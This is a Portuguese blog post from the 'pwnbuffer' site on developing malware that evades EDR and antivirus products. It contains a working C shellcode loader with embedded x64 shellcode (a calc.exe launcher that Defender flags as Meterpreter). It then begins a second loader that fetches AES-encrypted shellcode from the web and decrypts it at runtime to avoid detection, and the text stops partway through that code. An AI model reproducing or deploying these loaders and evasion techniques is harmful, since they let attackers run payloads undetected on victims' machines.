<!DOCTYPE html>
<html lang="pt-br">

<head>
  <title>
  Evas√£o de Defesa ¬∑ pwnbuffer
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="pwnbuffer">
<meta name="description" content="Malware Development - Evas√£o de EDR">
<meta name="keywords" content="team brazuca!">



  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Evas√£o de Defesa">
  <meta name="twitter:description" content="Malware Development - Evas√£o de EDR">

<meta property="og:url" content="https://pwnbuffer.org/posts/mount/edr-bypass/">
  <meta property="og:site_name" content="pwnbuffer">
  <meta property="og:title" content="Evas√£o de Defesa">
  <meta property="og:description" content="Malware Development - Evas√£o de EDR">
  <meta property="og:locale" content="pt_br">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-03-29T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-03-29T00:00:00+00:00">
    <meta property="article:tag" content="Malware">
    <meta property="article:tag" content="Edr-Evasion">
    <meta property="article:tag" content="Windows">
    <meta property="article:tag" content="Loader">




<link rel="canonical" href="https://pwnbuffer.org/posts/mount/edr-bypass/">


<link rel="preload" href="https://pwnbuffer.org/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://pwnbuffer.org/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://pwnbuffer.org/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="https://pwnbuffer.org/css/coder.min.b886fe0d9034709648f91f4ce178f51dd367d9350f82dd1132d54fd69bfca66f.css" integrity="sha256-uIb&#43;DZA0cJZI&#43;R9M4Xj1HdNn2TUPgt0RMtVP1pv8pm8=" crossorigin="anonymous" media="screen" />






  
    
    
    <link rel="stylesheet" href="https://pwnbuffer.org/css/coder-dark.min.165f5fe7c98269a5cfc54f81472e0f84ebc32d92bbe6c9db1f06962b0817bda1.css" integrity="sha256-Fl9f58mCaaXPxU&#43;BRy4PhOvDLZK75snbHwaWKwgXvaE=" crossorigin="anonymous" media="screen" />
  



 




<link rel="icon" type="image/svg+xml" href="https://pwnbuffer.org/img/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="https://pwnbuffer.org/img/favicon-32x32.ico" sizes="32x32">
<link rel="icon" type="image/png" href="https://pwnbuffer.org/img/favicon-16x16.ico" sizes="16x16">

<link rel="apple-touch-icon" href="https://pwnbuffer.org/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="https://pwnbuffer.org/images/apple-touch-icon.png">

<link rel="manifest" href="https://pwnbuffer.org/site.webmanifest">
<link rel="mask-icon" href="https://pwnbuffer.org/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-dark">
  

  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="https://pwnbuffer.org/">
      pwnbuffer
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/posts/">Artigos</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/categories/">Categorias</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/members/">Membros</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/about/">Sobre</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/wallpapers/">Wallpapers</a>
            </li>
          
        
        
          
          
          
            
              
                <li class="navigation-item menu-separator">
                  <span>|</span>
                </li>
                
              
              <li class="navigation-item">
                <a href="https://pwnbuffer.org/en/posts/mount/edr-bypass/">üá∫üá∏</a>
              </li>
            
          
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="https://pwnbuffer.org/posts/mount/edr-bypass/">
              Evas√£o de Defesa
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="2025-03-29T00:00:00Z">
                mar√ßo 29, 2025
              </time>
            </span>
            <span class="reading-time">
              <i class="fa-solid fa-clock" aria-hidden="true"></i>
              11 minutos de leitura
            </span>
          </div>
          <div class="authors">
  <i class="fa-solid fa-user" aria-hidden="true"></i>
    <a href="https://pwnbuffer.org/authors/mount/">Mount</a></div>

          <div class="categories">
  <i class="fa-solid fa-folder" aria-hidden="true"></i>
    <a href="https://pwnbuffer.org/categories/windows/">Windows</a>
      <span class="separator">‚Ä¢</span>
    <a href="https://pwnbuffer.org/categories/maldev/">Maldev</a>
      <span class="separator">‚Ä¢</span>
    <a href="https://pwnbuffer.org/categories/internals/">Internals</a></div>

          <div class="tags">
  <i class="fa-solid fa-tag" aria-hidden="true"></i>
    <span class="tag">
      <a href="https://pwnbuffer.org/tags/malware/">Malware</a>
    </span>
      <span class="separator">‚Ä¢</span>
    <span class="tag">
      <a href="https://pwnbuffer.org/tags/edr-evasion/">Edr-Evasion</a>
    </span>
      <span class="separator">‚Ä¢</span>
    <span class="tag">
      <a href="https://pwnbuffer.org/tags/windows/">Windows</a>
    </span>
      <span class="separator">‚Ä¢</span>
    <span class="tag">
      <a href="https://pwnbuffer.org/tags/loader/">Loader</a>
    </span></div>

        </div>
      </header>

      <div class="post-content">
        
        <h2 id="1-introdu√ß√£o">
  1. Introdu√ß√£o
  <a class="heading-link" href="#1-introdu%c3%a7%c3%a3o">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabe√ßalho"></i>
    <span class="sr-only">Link para o cabe√ßalho</span>
  </a>
</h2>
<p>Solu√ß√µes EDR <code>a.k.a</code> (Endpoint Detection and Response) s√£o uma evolu√ß√£o dos softwares de seguran√ßa que conhecemos como antiv√≠rus. EDRs modernos usam t√©cnicas avan√ßadas para detectar amea√ßas, hookando APIs, isolando o host da internet, analisando comportamento e classificando a detec√ß√£o por regra de <em>Indicador de Compromisso</em> (IOC) classificadas pelo <a href="https://attack.mitre.org/"  class="external-link" target="_blank" rel="noopener"><code>MITRE ATT&amp;CK</code></a>.</p>
<p>Neste artigo, demonstrarei como burlar EDRs usando t√©cnicas evasivas.</p>
<h2 id="2-analise-t√©cnica">
  2. Analise T√©cnica
  <a class="heading-link" href="#2-analise-t%c3%a9cnica">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabe√ßalho"></i>
    <span class="sr-only">Link para o cabe√ßalho</span>
  </a>
</h2>
<p>Em um ataque real, √© comum o uso de &ldquo;Loaders&rdquo; e &ldquo;Droppers&rdquo; que carregam o malware principal, passando por <code>est√°gios</code>. Esses est√°gios podem variar dependendo da complexidade do malware, algo que conhecemos como Chain ou Cadeia. Isso √© necess√°rio para que nosso ataque n√£o seja interrompido por um <code>AV/EDRs</code> rodando em segundo plano.</p>
<p>Aqui abaixo est√° um loader shellcode super simples:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;windows.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#999;font-style:italic">// abre o  calc.exe
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span><span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">char</span> shellcode[] = {
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0xfc</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x83</span>, <span style="color:#3677a9">0xe4</span>, <span style="color:#3677a9">0xf0</span>, <span style="color:#3677a9">0xe8</span>, <span style="color:#3677a9">0xc0</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x51</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x50</span>, <span style="color:#3677a9">0x52</span>, <span style="color:#3677a9">0x51</span>, <span style="color:#3677a9">0x56</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x31</span>, <span style="color:#3677a9">0xd2</span>, <span style="color:#3677a9">0x65</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x8b</span>, <span style="color:#3677a9">0x52</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0x60</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x8b</span>, <span style="color:#3677a9">0x52</span>, <span style="color:#3677a9">0x18</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x8b</span>, <span style="color:#3677a9">0x52</span>, <span style="color:#3677a9">0x20</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x8b</span>, <span style="color:#3677a9">0x72</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0x50</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x0f</span>, <span style="color:#3677a9">0xb7</span>, <span style="color:#3677a9">0x4a</span>, <span style="color:#3677a9">0x4a</span>, <span style="color:#3677a9">0x4d</span>, <span style="color:#3677a9">0x31</span>, <span style="color:#3677a9">0xc9</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x31</span>, <span style="color:#3677a9">0xc0</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0xac</span>, <span style="color:#3677a9">0x3c</span>, <span style="color:#3677a9">0x61</span>, <span style="color:#3677a9">0x7c</span>, <span style="color:#3677a9">0x02</span>, <span style="color:#3677a9">0x2c</span>, <span style="color:#3677a9">0x20</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0xc1</span>, <span style="color:#3677a9">0xc9</span>, <span style="color:#3677a9">0x0d</span>, <span style="color:#3677a9">0x41</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0x01</span>, <span style="color:#3677a9">0xc1</span>, <span style="color:#3677a9">0xe2</span>, <span style="color:#3677a9">0xed</span>, <span style="color:#3677a9">0x52</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x51</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x8b</span>, <span style="color:#3677a9">0x52</span>, <span style="color:#3677a9">0x20</span>, <span style="color:#3677a9">0x8b</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0x42</span>, <span style="color:#3677a9">0x3c</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x01</span>, <span style="color:#3677a9">0xd0</span>, <span style="color:#3677a9">0x8b</span>, <span style="color:#3677a9">0x80</span>, <span style="color:#3677a9">0x88</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x48</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0x85</span>, <span style="color:#3677a9">0xc0</span>, <span style="color:#3677a9">0x74</span>, <span style="color:#3677a9">0x67</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x01</span>, <span style="color:#3677a9">0xd0</span>, <span style="color:#3677a9">0x50</span>, <span style="color:#3677a9">0x8b</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x18</span>, <span style="color:#3677a9">0x44</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0x8b</span>, <span style="color:#3677a9">0x40</span>, <span style="color:#3677a9">0x20</span>, <span style="color:#3677a9">0x49</span>, <span style="color:#3677a9">0x01</span>, <span style="color:#3677a9">0xd0</span>, <span style="color:#3677a9">0xe3</span>, <span style="color:#3677a9">0x56</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0xff</span>, <span style="color:#3677a9">0xc9</span>, <span style="color:#3677a9">0x41</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0x8b</span>, <span style="color:#3677a9">0x34</span>, <span style="color:#3677a9">0x88</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x01</span>, <span style="color:#3677a9">0xd6</span>, <span style="color:#3677a9">0x4d</span>, <span style="color:#3677a9">0x31</span>, <span style="color:#3677a9">0xc9</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x31</span>, <span style="color:#3677a9">0xc0</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0xac</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0xc1</span>, <span style="color:#3677a9">0xc9</span>, <span style="color:#3677a9">0x0d</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x01</span>, <span style="color:#3677a9">0xc1</span>, <span style="color:#3677a9">0x38</span>, <span style="color:#3677a9">0xe0</span>, <span style="color:#3677a9">0x75</span>, <span style="color:#3677a9">0xf1</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0x4c</span>, <span style="color:#3677a9">0x03</span>, <span style="color:#3677a9">0x4c</span>, <span style="color:#3677a9">0x24</span>, <span style="color:#3677a9">0x08</span>, <span style="color:#3677a9">0x45</span>, <span style="color:#3677a9">0x39</span>, <span style="color:#3677a9">0xd1</span>, <span style="color:#3677a9">0x75</span>, <span style="color:#3677a9">0xd8</span>, <span style="color:#3677a9">0x58</span>, <span style="color:#3677a9">0x44</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0x8b</span>, <span style="color:#3677a9">0x40</span>, <span style="color:#3677a9">0x24</span>, <span style="color:#3677a9">0x49</span>, <span style="color:#3677a9">0x01</span>, <span style="color:#3677a9">0xd0</span>, <span style="color:#3677a9">0x66</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x8b</span>, <span style="color:#3677a9">0x0c</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x44</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0x8b</span>, <span style="color:#3677a9">0x40</span>, <span style="color:#3677a9">0x1c</span>, <span style="color:#3677a9">0x49</span>, <span style="color:#3677a9">0x01</span>, <span style="color:#3677a9">0xd0</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x8b</span>, <span style="color:#3677a9">0x04</span>, <span style="color:#3677a9">0x88</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x01</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0xd0</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x58</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x58</span>, <span style="color:#3677a9">0x5e</span>, <span style="color:#3677a9">0x59</span>, <span style="color:#3677a9">0x5a</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x58</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x59</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x5a</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x83</span>, <span style="color:#3677a9">0xec</span>, <span style="color:#3677a9">0x20</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x52</span>, <span style="color:#3677a9">0xff</span>, <span style="color:#3677a9">0xe0</span>, <span style="color:#3677a9">0x58</span>, <span style="color:#3677a9">0x41</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0x59</span>, <span style="color:#3677a9">0x5a</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x8b</span>, <span style="color:#3677a9">0x12</span>, <span style="color:#3677a9">0xe9</span>, <span style="color:#3677a9">0x57</span>, <span style="color:#3677a9">0xff</span>, <span style="color:#3677a9">0xff</span>, <span style="color:#3677a9">0xff</span>, <span style="color:#3677a9">0x5d</span>, <span style="color:#3677a9">0x48</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0xba</span>, <span style="color:#3677a9">0x01</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x8d</span>, <span style="color:#3677a9">0x8d</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0x01</span>, <span style="color:#3677a9">0x01</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0xba</span>, <span style="color:#3677a9">0x31</span>, <span style="color:#3677a9">0x8b</span>, <span style="color:#3677a9">0x6f</span>, <span style="color:#3677a9">0x87</span>, <span style="color:#3677a9">0xff</span>, <span style="color:#3677a9">0xd5</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0xbb</span>, <span style="color:#3677a9">0xf0</span>, <span style="color:#3677a9">0xb5</span>, <span style="color:#3677a9">0xa2</span>, <span style="color:#3677a9">0x56</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0xba</span>, <span style="color:#3677a9">0xa6</span>, <span style="color:#3677a9">0x95</span>, <span style="color:#3677a9">0xbd</span>, <span style="color:#3677a9">0x9d</span>, <span style="color:#3677a9">0xff</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0xd5</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x83</span>, <span style="color:#3677a9">0xc4</span>, <span style="color:#3677a9">0x28</span>, <span style="color:#3677a9">0x3c</span>, <span style="color:#3677a9">0x06</span>, <span style="color:#3677a9">0x7c</span>, <span style="color:#3677a9">0x0a</span>, <span style="color:#3677a9">0x80</span>, <span style="color:#3677a9">0xfb</span>, <span style="color:#3677a9">0xe0</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0x75</span>, <span style="color:#3677a9">0x05</span>, <span style="color:#3677a9">0xbb</span>, <span style="color:#3677a9">0x47</span>, <span style="color:#3677a9">0x13</span>, <span style="color:#3677a9">0x72</span>, <span style="color:#3677a9">0x6f</span>, <span style="color:#3677a9">0x6a</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x59</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x89</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#3677a9">0xda</span>, <span style="color:#3677a9">0xff</span>, <span style="color:#3677a9">0xd5</span>, <span style="color:#3677a9">0x63</span>, <span style="color:#3677a9">0x61</span>, <span style="color:#3677a9">0x6c</span>, <span style="color:#3677a9">0x63</span>, <span style="color:#3677a9">0x2e</span>, <span style="color:#3677a9">0x65</span>, <span style="color:#3677a9">0x78</span>, <span style="color:#3677a9">0x65</span>, <span style="color:#3677a9">0x00</span>
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">void</span>* exec_mem;
</span></span><span style="display:flex;"><span>    DWORD oldProtect;
</span></span><span style="display:flex;"><span>    HANDLE hThread;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    exec_mem = VirtualAlloc(<span style="color:#3677a9">0</span>, <span style="color:#6ab825;font-weight:bold">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (exec_mem == <span style="color:#24909d">NULL</span>) {
</span></span><span style="display:flex;"><span>        printf(<span style="color:#ed9d13">&#34;Falha ao alocar mem√≥ria.</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    memcpy(exec_mem, shellcode, <span style="color:#6ab825;font-weight:bold">sizeof</span>(shellcode));
</span></span><span style="display:flex;"><span>    VirtualProtect(exec_mem, <span style="color:#6ab825;font-weight:bold">sizeof</span>(shellcode), PAGE_EXECUTE_READ, &amp;oldProtect);
</span></span><span style="display:flex;"><span>    hThread = CreateThread(<span style="color:#24909d">NULL</span>, <span style="color:#3677a9">0</span>, (LPTHREAD_START_ROUTINE)exec_mem, <span style="color:#24909d">NULL</span>, <span style="color:#3677a9">0</span>, <span style="color:#24909d">NULL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (hThread == <span style="color:#24909d">NULL</span>) {
</span></span><span style="display:flex;"><span>        printf(<span style="color:#ed9d13">&#34;Falha ao criar thread.</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    WaitForSingleObject(hThread, INFINITE);
</span></span><span style="display:flex;"><span>    CloseHandle(hThread);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>O c√≥digo aloca mem√≥ria no pr√≥prio processo, copia o shellcode para essa regi√£o e define permiss√£o de RWX (Leitura, Escrita e Execu√ß√£o). Ap√≥s isso, inicia uma thread passando essa regi√£o como endere√ßo.</p>
<p>Vamos scannear o bin√°rio e ver o que o AV acha disso:</p>





<div class="tabs tabs-code tabs-left">
  




<style>
  .tabs input#tab-0-0:checked ~ .tab-content-0-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-0" id="tab-0-0" checked/>
<label for="tab-0-0" class="tab-label">C:</label>
<div class="tab-content tab-content-0-0">
  <pre tabindex="0"><code>C:\Users\mount\Desktop\&gt;avfind.exe -defender -path shit-loade.exe
2025/03/29 15:13:57 Scanning the file with Windows Defender: shit-loader.exe
2025/03/29 15:13:57 Threats found in the file. Starting the binary search
2025/03/29 15:13:57 Isolated detected bytes at offset 0x272F [10031/11776]
00000000  44 8b 40 24 49 01 d0 66  41 8b 0c 48 44 8b 40 1c  |D.@$I..fA..HD.@.|
00000010  49 01 d0 41 8b 04 88 48  01 d0 41 58 41 58 5e 59  |I..A...H..AXAX^Y|

2025/03/29 15:13:57 Found threat: Trojan:Win64/Meterpreter.E
2025/03/29 15:13:57 Found threat: Trojan:Win64/Rozena.AMBE!MTB
</code></pre>
</div>




</div>



<p>O Defender acabou de analisar o loader e detectou que essa sequ√™ncia de bytes no c√≥digo √© uma amea√ßa&hellip;</p>
<p>Olhando no IDA Pro e procurando por essa sequ√™ncia hexadecimal, vamos encontrar o nosso shellcode de calculadora.</p>
<p><img alt="map" src="https://pwnbuffer.org/images/mount/edr-bypass/calc.png"></p>
<h2 id="obfuscation--web-est√°gio">
  Obfuscation + Web Est√°gio
  <a class="heading-link" href="#obfuscation--web-est%c3%a1gio">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabe√ßalho"></i>
    <span class="sr-only">Link para o cabe√ßalho</span>
  </a>
</h2>
<p>O que mudou?</p>
<ul>
<li>Payload com AES</li>
<li>Chave de Decripta√ß√£o</li>
<li>Est√°gio Web</li>
</ul>
<p>Vamos mudar o c√≥digo para que ele interaja com o shellcode, baixando da internet e decriptando em tempo de execu√ß√£o. Isso vai impedir que o bin√°rio tenha uma entropia alta.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;windows.h&gt;</span><span style="color:#cd2828;font-weight:bold">  
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">    
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;Windows.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;string.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;psapi.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;winhttp.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;wincrypt.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#pragma comment(lib, &#34;winhttp.lib&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#pragma comment (lib, &#34;crypt32.lib&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#pragma comment (lib, &#34;advapi32&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#define okay(msg, ...) printf(&#34;[+] &#34; msg , ##__VA_ARGS__)
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#define info(msg, ...) printf(&#34;[*] &#34; msg , ##__VA_ARGS__)
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#define warn(msg, ...) printf(&#34;[-] &#34; msg , ##__VA_ARGS__)
</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">printMemoryInfo</span>(<span style="color:#6ab825;font-weight:bold">void</span>* address, <span style="color:#6ab825;font-weight:bold">const</span> <span style="color:#6ab825;font-weight:bold">char</span>* name) {
</span></span><span style="display:flex;"><span>    MEMORY_BASIC_INFORMATION mbi;
</span></span><span style="display:flex;"><span>    VirtualQuery(address, &amp;mbi, <span style="color:#6ab825;font-weight:bold">sizeof</span>(mbi));
</span></span><span style="display:flex;"><span>    printf(<span style="color:#ed9d13">&#34;[+] %s: %p</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, name, address);
</span></span><span style="display:flex;"><span>    info(<span style="color:#ed9d13">&#34;    Base Address: %p</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, mbi.BaseAddress);
</span></span><span style="display:flex;"><span>    info(<span style="color:#ed9d13">&#34;    Allocation Base: %p</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, mbi.AllocationBase);
</span></span><span style="display:flex;"><span>    info(<span style="color:#ed9d13">&#34;    Allocation Protect: 0x%X</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, mbi.AllocationProtect);
</span></span><span style="display:flex;"><span>    info(<span style="color:#ed9d13">&#34;    Region Size: %zu bytes</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, mbi.RegionSize);
</span></span><span style="display:flex;"><span>    info(<span style="color:#ed9d13">&#34;    State: 0x%X (MEM_COMMIT=0x1000, MEM_RESERVE=0x2000)</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, mbi.State);
</span></span><span style="display:flex;"><span>    info(<span style="color:#ed9d13">&#34;    Protect: 0x%X (PAGE_EXECUTE=0x10, PAGE_READWRITE=0x04)</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, mbi.Protect);
